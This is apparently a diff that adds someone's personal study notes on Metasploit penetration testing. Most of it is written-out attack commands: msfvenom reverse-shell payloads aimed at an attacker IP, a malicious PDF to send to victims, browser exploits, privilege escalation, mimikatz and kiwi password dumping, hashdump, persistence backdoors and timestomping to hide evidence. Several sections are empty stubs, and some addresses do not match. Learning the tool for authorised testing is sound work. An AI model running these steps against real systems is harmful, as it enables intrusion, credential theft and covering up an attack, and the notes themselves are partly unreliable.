@@ -1,0 +1,446 @@
+5 phases of pen testing:
+1)Reconniassance:Information gathering of target(s)
+2)Scanning:detailed info gathering eg open ports,service versions.metasploit also supports integration with 3rd party apps like nmap,nessus,their info can be directly imported in metasploit
+3)Gaining access:exploit
+4)Maintaining access
+5)covering tracks:remain hidden in target system,remove traces of attack(eg remove log files)
+
+
+Metasploit fits in all 5 levels of pentest.
+------------------------
+Metasploit Database:
+It is a postgresql database for storing info eg hostname,exploit results.
+Aditionally this can be very helpful during post exploitation and reporting.
+
+Commands:
+>msfdb init     #initialize the database
+>msfdb reinit   #delete and reinitialize db
+>msfdb delete   #detete database
+>msfdb status   #check db status
+>msfdb start    #start db
+>msfdb stop     #stop db
+>msfdb restart  #restart db
+
+
+
+from msfconsole:
+>db_connect       #connect to an existing database
+>db_disconnect    #disconnect from current db
+>db_export        #export database content 
+>db_import        #import db
+>db_nmap          #execute nmap and record the output
+
+>service          #lists all the services in the database
+>vulns            #lists all the vulnaribilities in the database
+>workspace        #switch between database workspaces
+
+Database Workspace:
+Workspaces are a way to keep track of scans,vulnerabilities,and activities being currently worked upon
+To use a workspace confirm you have a connection to the database,by issuing a db_status command
+msf>db_status
+Once connection is established issue a "workspace" command to list the workspaces.There a default workspace called "default"
+msf>workspace [-v(vurbose)]   #list workspaces
+msf>workspace -a workspace1   #create a workspace 
+msf>workspace -d workspace1   #delete a workspace
+msf>workspace work2           #switch to a workspace
+msf>workspace -D              #delete all workspaces
+msf>workspace -r <old> <new>  #rename workspace
+msf>workspace -h              #help
+
+=====================================================================================================================================================
+Scanning and information gathering:
+we can also take scans from other tools like nmap and import them in metasploit
+
+There are number of scanners are contained within metasploit
+they can be found inside "Auxiliary/Scanner" directory
+Some scanners include portscan,dns,mssql,rdp 
+
+>msfconsole
+msf>use auxiliary/scanner/<scanner type>/<scanner name>
+msf>use auxiliary/scanner/portscan/syn
+msf>show options  #lists scanner options eg RHOST
+msf>set RHOST 192.168.1.1/24
+msf>run   #start scan
+suppose in output we see port 80 is open for 192.168.1.1, since 80 is http port we can do further scanning
+msf>back
+msf>use auxiliary/scanner/http/http_version
+msf>set RHOST 192.168.1.1
+msf>run
+outputs http version
+
+---------------------------
+Nmap Metasploit integration:
+There are two ways to work with nmap and metasploit:
+Way 1:
+Import existing scan into metasploit
+This is done using "db_import" function and the filename(must be xml format)  containing the scan information.
+>db_import scan.xml
+Note that the scan file has to be xml format.
+this is an output function of nmap scans
+>nmap -oX scan.xml -T4 -A -v 192.168.100.50  #outputs scan.xml
+>cat scan.xml
+>msfconsole
+msf>db_status     #check if database is up
+msf>db_import scan.xml
+msf>hosts 192.180.100.50
+msf>services 192.180.100.50  #services discovered in nmap scan
+
+
+Way 2:
+Initiating scan from metasploit and writing the data directly to database
+this is done using "db_nmap" function
+example:  db_nmap -A 192.168.100.50   #ip address of target to scan
+This will write the nmap results directlt to database from which we can query
+>msfconsole
+msf>db_nmap -A 192.168.100.50
+msf>hosts 192.180.100.50
+msf>services 192.180.100.50  #services discovered in nmap scan
+----------------------------------
+Nessus-Metasploit integration:
+To run a Nessus scan from Metasploit,you start out with the same process as reviewing scan
+Run command "load nessus"
+Run command "nessus_connect" with username:password
+>nessus_connect <userame:password@location:8834>
+On the nessus not only an account is needed but also a scan policy has to be setup to perform scans
+
+To review existing nessus scan issue the following command:
+>nessus_scan_list -c
+This will give a list of completed scans and their scan ids
+>nessus_report_hosts <scan_id>   #this will give you a general list of hosts vulnaribility counts
+>nessus_report_vulns <scan_id>   #this will give you a general list of hosts vulnaribilities
+
+>msfconsole
+msf>load nessus
+msf>nessus_help    # nessus command help
+msf>nessus_connect <userame:password@location:8834>
+msf>nessus_scan_list 
+msf>nessus_report_hosts <scan_id> 
+msf>nessus_report_vulns <scan_id> 
+
+To run a nessus scan from metasploit you startout with the same process as reviewing scan
+>msfconsole
+msf>load nessus
+msf>nessus_connect <userame:password@location:8834>
+
+Nessus comes with a number of scan templates including:
+advanced dynamic scan,basic network scan,host discovery
+In nessus create the policy and set its availability to run
+Once everything is set from Nessus side,you can run scans from Metasploit.
+From msfconsole connect to Nessus using bridge. ie using command "nessus_policy_list"
+Scan command: >nessus_scan_new <UUID of policy> <scan name> <description> <targets>   #sacn will be queued(not run)
+To launch the actual scan issue the following command:
+>nessus_scan_launch <scan id>
+>nessus_scan_list    #get status of scan
+
+Additional commands:
+>nessus_scan_pause
+>nessus_scan_stop
+>nessus_scan_details
+>nessus_scan_export
+
+>msfconsole
+msf>load nessus
+msf>nessus_connect <userame:password@location:8834>
+msf>nessus_scan_list    #get status of scan
+msf>nessus_policy_list   #policy list
+msf>nessus_scan_new <UUID of policy> <scan name> <description> 192.168.100.50   #sacn will be queued(not run),we can copy UUID of policy and scan name from  output of nessus_policy_list
+msf>nessus_scan_launch <scan id>
+msf>nessus_scan_list 
+msf>nessus_report_hosts <scan_id> 
+msf>nessus_report_vulns <scan_id> 
+------------------------------------------------
+Metasploit-Nexpose integration:
+
+
+
+
+====================================================================================
+Meterpreter:
+Short for Meta-Interpreter
+It is a special post exploit payload that executes directly within the memory of a running processs
+This payload provides a shell or communication channel to the compromised system.
+From here we can run commands,launch program,or gather other information from the system.
+
+Attemps to hide the process from being displayed on the compromised system
+Offers flexibility in which operation(s) you would like to perform on the compromized system.
+All commands run through the meterpreter execute in the context of the running process.
+When deployed the meterpreter provides an api from which various actions can take place.
+
+
+>msfconsole 
+msf>use exploit/windows/http/manageengine_connectionid_write
+msf>show payloads 
+msf>set payload windows/meterpreter/reverse_tcp
+msf>show options
+msf>set <key> <value>
+msf>exploit
+
+Meterpreter commands:
+meterpreter>sysinfo
+meterpreter>ps   #process list
+meterpreter>getpid    #get our process id
+meterpreter>migrate <pid>  #move to a different process
+meterpreter>getpid
+meterpreter>shell   #move to os shell
+
+
+Meterpreter scripts:
+Once you have successfully compromised a system and pushed meterpreter as a payload,we need to do something.
+They are executed with run command with the script name
+There are tw set of scripts:
+1)old scripts:
+primarily focused on windows and are located in directory:
+/opt/metasploit-framework/embedded/framework/scripts/meterpreter
+
+example:   
+meterpreter>run enum_logged_on_users -c    #retrieves list of currently logged on users
+meterpreter>run checkvm    #checks if exploiter machine is a Virtual machine
+meterpreter>run winenum
+
+2)new scripts:
+located in directory:
+/opt/metasploit-framework/embedded/framework/modules/post/<category>
+There are 12 categories eg. android,firefox,windows,osx etc
+meterpreter>run  <script path(complete path required for new scripts)>  
+
+meterpreter>run post/windows/gather/enum_logged_on_users   #list of current logged on users
+meterpreter>run post/windows/gather/checkvm                #checks if exploiter machine is a Virtual machine
+------------------------------------------------------------------
+Railgun:
+Railgun is an extension of meterpreter specifically for windows.
+It allows loading and execution from any DLL on the exploited system
+msdn.microsoft.com - has full list of documented api calls
+To activate Railgun,type "irb" on the meterpreter console
+This opens an interactive ruby shell on the exploited system
+meterpreter>irb
+>railgun.<dll name>.<function>(<parameters>)
+
+example: >railgun.netapi32.NetUserDel(nil,"testuser")       
+  
+------------------------------------
+Custom meterpreter script:
+Custom scripts are written in Ruby and stored in meterpreter directory of metasploit installation(/opt/metasploit-framework/embedded/framework/script/meterpreter)
+
+=========================================================
+Client side exploitation:
+1)Browser exploits:
+Attacks can be very general ,exploiting a supported protocol or service such as WebDAV
+It may also exploit a plugin such as flash or java or activex or vb
+script
+
+2)File Format exploits:
+Taking advantage of client side application
+Can take advantage of how OS interacts with the application
+Common app to attack eg Adobe acrobat,ms office documents
+
+3)Standalone Attack:
+Here we are creating our own executable that has to be executed on target
+Can be done using tools like MSFVenom
+-----------------------
+Delivering exploits:
+email,website etc
+----------------------
+Browser exploits:
+The biggest issue is not the exploit but determining which browser(s) the target machine is using.
+
+>msfconsole
+msf>use auxiliary/server/browser_autopwn
+msf>show options
+msf>set LHOST <attacker ip>
+msf>set SVRHOST <attacker ip>
+msf>exploit
+shows list of exploits with exploit modulepath and payload path
+it will give you a list of URLs any one(or more) is needed to be executed from victim browser
+
+msf>session             #show the created session for every exploit
+msf>sessions -i <id>    #open meterpreter session
+meterpreter>sysinfo
+
+------------------------------------
+search all mozilla exploits:
+msf>search type:exploit target:mozilla
+msf>info <full exploit path>  #to se info on a particular exploit
+msf>use exploit/windows/browser/firefox_smil_uaf
+msf>show options
+msf>set SRVHOST <attacker ip>
+It will give a URL which has to be hit from victim machine's firefox browser
+msf>sessions
+msf>sessions -i <id>
+meterpreter>sysinfo
+
+---------------------------------
+File Format exploits:
+These exploit comes in two parts:
+a)First we have to create a file of type pdf,word,image etc and embedding the vulnerability in it.
+b)victim user should open the file and execute the malicious code
+
+file format exploit location:
+/opt/metasploit-framework/embedded/framework/modules/exploits/{OS}/fileformat
+ the exploits is divided into os eg unix,ios,windows,android
+eg. /opt/metasploit-framework/embedded/framework/modules/exploits/windows/fileformat
+
+we can search these exploits using msf search:
+msf>search ref:fileformat
+msf>search ref:fileformat name:adobe
+msf>use exploit/windows/fileformat/adobe_pdf_embedded_exe
+msf>set payload windows/meterpreter/reverse_tcp
+msf>options
+msf>set filename "test.pdf"
+msf>set LHOST <attacker ip>
+msf>exploit
+it will generated our malicious pdf file,now we have to send this file to victim's machine
+
+----------------------------------
+Standalone Attack:
+Sometimes there is no immediate vulnerability to take advantage of.
+So generate your own payload.
+This is where MSFvenom comes in which is a standalone payload generator for metasploit
+MSFvenom replaces older MSFpayload and MSFencode for generating payload.
+MSFvenom usage:
+   >msfvenom [options] <var=val>
+example:
+>msfvenom -p windows/meterpreter/reverse_tcp LHOST =<IP> -f exe -o payload.exe
+>msfvenom  #see help
+
+>msfvenom --platform windows -p windows/meterpreter/reverse_tcp lhost=192.168.100.108 lport=4444 --format exe -o payload.exe
+this will create payload.exe,now we have to send this file to victim's machine
+----------------------------------
+Delivering Exploits:
+
+there are atleast three different in-direct drive-by download methods:
+
+
+
+
+
+
+
+=====================================
+Server exploits:
+When one speaks of server exploits,it usually refers Windows server(may be linux oi ios as well in some cases).
+There can be server services as well webserver,database,ftp,rdp 
+Also refers to hardwares like firewalls,routers,voip and iot devices.
+ 
+
+
+
+==========================================================
+Privilege escalation:
+3 ways to escalate:
+1)use getsystem command
+2)use the ps and migrate command(move meterpreter from current process to another process)
+3)Use payload specifically designed to get higher privilege in that OS.
+
+---------------------------
+1)use getsystem command
+meterpreter>getuid   #get user
+meterpreter>getsystem -h
+meterpreter>getsystem   #privilege escalation
+meterpreter>getuid      #confirm privilege escalation
+meterpreter>
+
+-----------------------------------
+2)use the ps and migrate command(move meterpreter from current process to another process):
+meterpreter>getpid       #get current process id 
+meterpreter>ps           #see list of process running
+meterpreter>migrate <new pid> #migrate to a different process
+meterpreter>getpid 
+----------------------------------
+3)Use payload specifically designed to get higher privilege in that OS.
+
+msf exploit>options    #see available targets
+msf exploit>set target <number>
+msf exploit>show payloads
+msf exploit>set payload windows/meterpreter/reverse_tcp  #with this we will have hight level privilege in windows
+msf exploit>show options
+msf exploit>run
+-------------------------------------
+Gathering password with mimikatz and kiwi(both integrated in metasploit):
+
+Mimikatz and its successor kiwi(mimikatz v2) will attempt to retrieve password from memory 
+
+meterpreter>getuid
+meterpreter>getsystem   #privilede escalation
+meterpreter>load mimikatz
+meterpreter>help mimikatz
+meterpreter>migrate <any 64bit pid>   #migrate to any 64bit process to use mimikatz
+Following commands will dump in memory username/password
+meterpreter>kerberos
+meterpreter>msv
+meterpreter>tspkg
+meterpreter>wdigest
+
+meterpreter>mimikatz-command -f fu::
+----
+meterpreter>load kiwi
+meterpreter>help kiwi
+meterpreter>getsystem
+=================================================================
+Post Exploitation:
+They are divided into three groups:
+1)Escalate
+2)Gather
+3)Manage
+Aditionally ther are grouped depending on os eg windows,linux,osx and multi(multi-os, service specific eg. jboss,tomcat).
+
+All of them can be found  in "/modules/post" directory of metasploit.
+
+msf>search post/windows
+msf>search post/linux
+
+-------------------
+Gather:
+
+open any meterpreter session:
+mererpreter>run post/windows/gather/dnscache_dump    #dumps the dns cache of target machime 
+mererpreter>run post/windows/gather/enum_computers
+mererpreter>run post/windows/gather/enum_termserv
+mererpreter>getsystem
+mererpreter>run post/windows/gather/hashdump
+
+---------------------
+Maintaining Access:
+
+Persistance:
+persistance is the repeated of system(s) after they have been compromised without having to repeat the exploit.
+Persistence comes in several forms:
+1)installation of backdoors
+2)modification of a service to connect back to a system
+3)creation of alternate logins
+4)adding items to startup areas of OS
+
+
+example:
+open any meterpreter session
+meterpreter>run persistance -h   #help
+meterpreter>run persistance -A -P windows/meterpreter/reverse_tcp  -X  -i 120 -p 4444 -r 192.168.100.108
+
+Now meterpreter seeeion will be reestablished on system restart
+
+-------------------------------
+Covering your tracks:
+We need to clean up/remove evidence of the exploit
+There are two methods:
+1)timestomping
+2)clearing events
+Each of the method requires us to escalate privilede using one of the methods(eg getsystem,migrate)
+
+meterpreter>getsystem
+meterpreter>cd "c:/tmp"
+meterpreter>timestomp vagrant-shell.psl  -v  #show time attributes
+meterpreter>timestomp vagrant-shell.psl -m "03/11/1999 10:05:01"
+meterpreter>timestomp vagrant-shell.psl -z "03/11/1999 10:05:01"
+==================================
+Social Engineering Toolkit(SET):
+SET is a 3rd party application that works with metasploit
+this tool is designed to exploit users through social engineering using primarily the email as the attack vector.
+
+>setoolkit
+
+
+
+
+
+
+
+
